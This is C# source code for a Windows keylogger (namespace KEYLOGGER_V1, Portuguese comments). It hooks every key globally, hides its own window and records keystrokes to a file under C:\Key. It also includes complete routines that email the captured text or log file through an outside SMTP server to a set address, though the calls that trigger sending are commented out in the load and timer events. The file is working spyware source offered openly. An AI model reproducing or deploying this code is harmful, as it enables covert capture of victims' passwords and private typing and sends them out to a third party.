using System;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Diagnostics;

namespace KEYLOGGER_V1
{
    public partial class FrmHome : Form
    {
        public FrmHome()//METODO CONSTRUTOR.
        {
            InitializeComponent();
        }

//------------------------------------------------------------------[EVENTOS]--------------------------------------------------------------------------------------           
        private void FrmHome_Load(object sender, EventArgs e)                  //EVENTO: Inicialização do formulário, para verificações Iniciais.
        {   
            invisibilidade();                   //Torna o formulário INVISIVEL
            MetodosDeEventosHook();        //Ativa os eventos do teclado.
          
            if (Verifica_Existencia_Log() == true)     //Comparação de existencia do Log
            {
                if (Verifica_Conexao_Web() == true)   //Verificação de Conexão.
                {  
                    //EnviarEmailLog(@"C:\Key\Keylogger.txt"); //Envia o log por EMAIL.
                }

            }

        }
        private void txtTextoDigitado_TextChanged(object sender, EventArgs e)  //EVENTO: quando ouver uma alteração no texto, irá ser verificado as teclas.
        {
            String caracter = "[Ctrl][Delete][Esc]"; // teclas para o evento

            if (teclaDeVisibilidade(txtTextoDigitado.Text, caracter) == caracter) // Comparação das teclas. simulação das teclas de atalho 
            {
                if (this.Opacity == 0 && this.ShowInTaskbar == false)             // Verifica se o formulario já esta invisivel
                {
                    visibilidade();
                }
                else
                {
                    invisibilidade();
                }
            }
        }
        private void FrmHome_FormClosing(object sender, FormClosingEventArgs e)//EVENTO: Quando o formulario estiver fechando, salva backup.
        {
            File.Delete(@"C:\Key\Keylogger.txt"); //Deleta o (arquivo / Log) anterior.
            if (txtTextoDigitado.Text != "")      //Compara se foi digitado teclas.
            {
                criarLog(@"C:\Key\Keylogger.txt"); //Salva um novo backup.
            }

        }
        private void tmEnviarEmail_Tick(object sender, EventArgs e)            //EVENTO: Timer de Enviar as teclas digitadas para o EMAIL.
        {
            //SalvaLogOuEnviaEmail();
        }
        void gkh_KeyDown(object sender, KeyEventArgs e)                        //EVENTO: do HOOK para scaneamento das teclas
        {
            txtTextoDigitado.Text += MapeamentoTraducaoDasTeclas(Convert.ToString(e.KeyCode));
            txtTextoDigitadoLimpo.Text += MonitoramentoDeTeclas(MapeamentoTraducaoDasTeclas(Convert.ToString(e.KeyCode)));
        }

//------------------------------------------------------------------[METODOS]--------------------------------------------------------------------------------------        
       
        globalKeyboardHook gkh = new globalKeyboardHook(); 
        //INSTÂNCIA DA CLASSE: que retorna o valor das teclas digitada em cada KEYDOWN

        [DllImport("wininet.dll")]                                                                       
        //Utilizado para a Confirmação da conexão. 
        private extern static Boolean InternetGetConnectedState(out int Description, int ReservedValue); //Utilizado para a Confirmação da conexão.
        
        private void HookAll()                                    //METODO: pega o enumerador da tecla e substitui por uma sequencia de caracteres
        {
            foreach (object key in Enum.GetValues(typeof(Keys)))
            {
                gkh.HookedKeys.Add((Keys)key);
            }
        }
        void MetodosDeEventosHook()                               //METODO: Ativa os eventos do HOOK(scan das teclas) 
        {
            gkh.KeyDown += new KeyEventHandler(gkh_KeyDown);
            HookAll();
        }
        bool Verifica_Existencia_Log()                            //METODO: Verifica se diretorio do LOG existe.
        {

            if (File.Exists(@"C:\Key\Keylogger.txt"))
            {
                return true;
            }
            else
            {
                Directory.CreateDirectory(@"C:\Key\");
                return true;
            }

        }      
        bool Verifica_Conexao_Web()                               //METODO: Verifica que se a conexão, e retorna [TRUE] 
        {
            bool result;

            try
            {
                int Description;

                result = InternetGetConnectedState(out Description, 0);

            }

            catch
            {
               
                result = false;

            }

            return result;
        }
        void EnviarEmail(String Texto)                            //METODO: Email com as teclas digitadas. 
        {

            MailMessage Email;
            Stopwatch Stop = new Stopwatch();
            Email = new MailMessage();
            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));// ENVIE PERGUNTAS NESSE EMAIL ;)
            Email.From = (new MailAddress("OrionOficial@outlook.com")); // <--------------------------
            Email.Subject = "KeyLLogger";
            Email.IsBodyHtml = true;
            Email.Body = Texto;
            SmtpClient cliente = new SmtpClient("smtp.live.com", 587); // TEM QUE SER HOTMAIL ou OUTLOOK
            using (cliente)
            {
                cliente.Credentials = new System.Net.NetworkCredential("SeuEmailAqui@outlook.com", "SUA SENHA");// COLOQUE SEU EMAIL E SENHA PARA TESTAR
                                                                               // NAO ESQUEÇA DE APAGAR AO COMITAR  ;) CONSELHO!!
                cliente.EnableSsl = true;
                cliente.Send(Email);
            }
          
            txtTextoDigitado.Clear();

        }
        void EnviarEmailLog(String DirLog)                        //METODO: Envia email com o log como anexo. 
        {
            MailMessage Email;
            Stopwatch Stop = new Stopwatch();
            Email = new MailMessage();
            Email.To.Add(new MailAddress("OrionOficial@outlook.com"));  // ENVIE PERGUNTAS NESSE EMAIL ;)
            Email.From = (new MailAddress("OrionOficial@outlook.com")); // <--------------------------
            Email.Subject = "KeyLLogger";
            Email.IsBodyHtml = true;
            Email.Attachments.Add(new Attachment(DirLog));
            
            SmtpClient cliente = new SmtpClient("smtp.live.com", 587); // TEM QUE SER HOTMAIL ou OUTLOOK
            using (cliente)
            {
                cliente.Credentials = new System.Net.NetworkCredential("SeuEmailAqui@outlook.com", "SUA SENHA");// COLOQUE SEU EMAIL E SENHA PARA TESTAR
                                                                                                                   // NAO ESQUEÇA DE APAGAR AO COMITAR  ;) CONSELHO!!
                cliente.EnableSsl = true;
                cliente.Send(Email);
            }

        }
        void criarLog(String Dirlog)                              //METODO: Cria o log das teclas digitadas.
        {

            StreamWriter SW = new StreamWriter(Dirlog, true);
            SW.Write(txtTextoDigitado.Text);
            SW.Close();
            txtTextoDigitado.Clear();
        }
        void SalvaLogOuEnviaEmail()                               //METODO: Verifica a conexão. se estiver conectado a internet ele envia por EMAIL.
        {

            if (Verifica_Conexao_Web() == true)
            {
                if (txtTextoDigitado.Text != "")
                {
                    EnviarEmail(txtTextoDigitado.Text); //Envia email.
                }


            }
            else
            {
                if (txtTextoDigitado.Text != "")
                {
                   criarLog(@"C:\Key\Keylogger.txt"); //Cria Backup.
                }
            }
        }
        String MapeamentoTraducaoDasTeclas(String Key)            //METODO: Mapeamento de teclas, e Comparação das teclas para substituição.
        {

            switch (Key)
            {

                case "LWin":
                    return "[Win]";
                case "LControlKey":
                    return "[Ctrl]";
                case "RControlKey":
                    return "[Ctrl]";
                case "LMenu":
                    return "[Alt]";
                case "RMenu":
                    return "[Alt]";
                case "Return":
                    return "[Enter]";
                case "Space":
                    return "[Space]";
                case "LShiftKey":
                    return "[Shift]";
                case "RShiftKey":
                    return "[Shift]";
                case "Capital":
                    return "[Caps Lock]";
                case "Tab":
                    return "[Tab]";
                case "Oemtilde":
                    return "'";
                case "Escape":
                    return "[Esc]";
                case "Back":
                    return "[Back]";
                case "PrintScreen":
                    return "[Print Screen]";
                case "Pause":
                    return "[Pause Break]";
                case "Insert":
                    return "[Insert]";
                case "Delete":
                    return "[Delete]";
                case "Home":
                    return "[Home]";
                case "PageUp":
                    return "[Page Up]";
                case "Next":
                    return "[Page Down]";
                case "End":
                    return "[End]";
                case "Apps":
                    return "[Menu]";
                case "Up":
                    return "[Up]";
                case "Down":
                    return "[Down]";
                case "Right":
                    return "[Right]";
                case "Left":
                    return "[Left]";
                case "Oemplus":
                    return "=";
                case "OemMinus":
                    return "-";
                case "Oem6":
                    return "[";
                case "Oem5":
                    return "]";
                case "Oem7":
                    return "";
                case "OemOpenBrackets":
                    return "´";
                case "Oem1":
                    return "Ç";
                case "Oemcomma":
                    return ",";
                case "OemPeriod":
                    return ".";
                case "OemQuestion":
                    return ";";
                case "D1":
                    return "1";
                case "D2":
                    return "2";
                case "D3":
                    return "3";
                case "D4":
                    return "4";
                case "D5":
                    return "5";
                case "D6":
                    return "6";
                case "D7":
                    return "7";
                case "D8":
                    return "8";
                case "D9":
                    return "9";
                case "D0":
                    return "0";
                case "F1":
                    return "[F1]";
                case "F2":
                    return "[F2]";
                case "F3":
                    return "[F3]";
                case "F4":
                    return "[F4]";
                case "F5":
                    return "[F5]";
                case "F6":
                    return "[F6]";
                case "F7":
                    return "[F7]";
                case "F8":
                    return "[F8]";
                case "F9":
                    return "[F9]";
                case "F10":
                    return "[F10]";
                case "F11":
                    return "[F11]";
                case "F12":
                    return "[F12]";
                default:

                    return Key;
            }


        }
        void invisibilidade()                                     //METODO: Deixa o formulário invisivel.
        {
            this.Opacity = 0;
            this.ShowInTaskbar = false;

        }
        public void visibilidade()                                //METODO: Deixa o formulário visivel.
        {
            this.Opacity = 100;
            this.ShowInTaskbar = true;
        }
        String teclaDeVisibilidade(String texto, String caracter) //METODO: Pega a quantidade de caracteres necessario "[Ctrl][Delete][Esc]"
        {

            int contCarac = caracter.Length;
            int contText = texto.Length;

            if (contText >= contCarac)
            {
                int result = contText - contCarac;
                String caracteres = texto.Substring(result, contCarac);
                return caracteres;
            }
            else
            {
                return texto;
            }
            

        }

        bool ShiftPressionado = false;

        public String MonitoramentoDeTeclas(String tecla)
        {
            return Mon_Letras_teclasSuporte(tecla);
        }
        
        public string Mon_Letras_teclasSuporte(string tecla)
        {
            string segundoCaracter = null;
            string primeiroCaracter = tecla.Substring(0,1);
           
            try
            {
                segundoCaracter = tecla.Substring(1, 1);
                
                switch (tecla)
                {   case "[Shift]":
                            ShiftPressionado = true;
                        break;
                    case "[Space]":
                        return " ";

                    default:
                        break;
                }

                return "";
               
            }
            catch (Exception)
            {

                string teclasAlteradas;
                if (Control.IsKeyLocked(Keys.CapsLock))            //Verifica se o capslook foi ativo.
                {
                    if (ShiftPressionado == true)
                    {
                       
                        teclasAlteradas = tecla.ToLower();
                        ShiftPressionado = false;
                    }
                    else
                    {
                        teclasAlteradas = tecla.ToUpper();   
                    }
                }
                else 
                {
                    if (ShiftPressionado != true)
                    {

                        teclasAlteradas = tecla.ToLower();
                        
                    }
                    else
                    {
                        teclasAlteradas = tecla.ToUpper();
                        ShiftPressionado = false;
                    }
                }

                return teclasAlteradas;

            }
            
        
        }
               
    }
}
